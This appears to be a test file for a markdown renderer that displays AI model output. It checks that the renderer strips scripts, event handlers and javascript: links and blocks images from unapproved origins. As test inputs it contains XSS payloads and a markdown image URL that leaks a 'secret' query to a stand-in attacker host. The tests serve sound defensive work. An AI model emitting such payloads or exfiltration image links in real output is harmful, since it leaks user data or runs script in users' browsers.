import { imageGate, renderMarkdown } from '../src/render';

describe('renderMarkdown', () => {
  it('renders markdown', () => {
    expect(renderMarkdown('**bold**')).toContain('<strong>bold</strong>');
  });

  it('strips scripts and event handlers from model output', () => {
    const html = renderMarkdown('<script>alert(1)</script><img src=x onerror="alert(1)">');

    expect(html).not.toContain('<script');
    expect(html).not.toContain('onerror');
  });

  it('strips javascript: URLs from markdown and raw HTML links', () => {
    const fromMarkdown = renderMarkdown('[click](javascript:alert(1))');
    const fromHtml = renderMarkdown('<a href="javascript:alert(1)">click</a>');

    expect(fromMarkdown).not.toMatch(/href="javascript:/i);
    expect(fromHtml).not.toMatch(/href="javascript:/i);
  });

  it('loads images only from the host page and allowed origins', () => {
    const gate = imageGate(['https://qhse-mcp.example.com'], 'https://erp.example.com/app/');

    expect(gate('/api/gaith/files/a1')).toBe(true); // host's own origin
    expect(gate('https://qhse-mcp.example.com/files/ticket')).toBe(true);
    expect(gate('https://attacker.example/pixel.png?q=secret')).toBe(false);
    expect(gate('data:image/png;base64,AAAA')).toBe(false);
  });

  it('turns a blocked image into a plain link instead of loading it', () => {
    const html = renderMarkdown('![leak](https://attacker.example/x.png?q=secret)', () => false);

    expect(html).not.toContain('<img');
    expect(html).toContain('href="https://attacker.example/x.png?q=secret"');
    expect(html).toContain('>leak</a>');
  });

  it('keeps allowed images and loads them without sending a referrer', () => {
    const html = renderMarkdown('![photo](https://qhse-mcp.example.com/files/t1)', () => true);

    expect(html).toContain('<img');
    expect(html).toContain('referrerpolicy="no-referrer"');
  });

  it('opens links in a new tab without access to the host page', () => {
    const html = renderMarkdown('[docs](https://example.com)');

    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });
});
